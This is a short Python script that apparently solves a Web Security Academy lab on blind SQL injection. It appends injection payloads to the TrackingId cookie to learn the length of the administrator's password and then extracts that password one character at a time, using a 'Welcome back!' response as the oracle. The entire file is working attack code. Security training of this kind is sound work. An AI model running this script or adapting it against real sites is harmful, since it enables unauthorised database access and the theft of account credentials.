import requests

url = 'https://0abf00ad03a6896480c9fda7000900a9.web-security-academy.net/filter?category=Lifestyle'
characters = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+'

def get_length():
    for i in range(1, 101):
        cookie = {'TrackingId': 'KrwKMi4u9lOjmJe5', 'session': 'kDru5DEBS7iqNyom5qpkOXkoBGvmBXHm'}
        payload = f"' AND LENGTH((SELECT password FROM users WHERE username='administrator'))={i}--"
        cookie['TrackingId'] = cookie['TrackingId'] + payload
        r = requests.get(url, cookies=cookie)
        if 'Welcome back!' in r.text:
            return i

def get_data(length):
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            cookie = {'TrackingId': 'KrwKMi4u9lOjmJe5', 'session': 'kDru5DEBS7iqNyom5qpkOXkoBGvmBXHm'}
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'), {i}, 1) = '{char}'--"
            cookie['TrackingId'] = cookie['TrackingId'] + payload
            r = requests.get(url, cookies=cookie)
            if 'Welcome back!' in r.text:
                temp += char
                break
    return temp

length = get_length()
print(f"Password Lenght: {length}")
print("Dumping Data... Please be Patient.")
data = get_data(length)
print(f"Got it!: {data}")
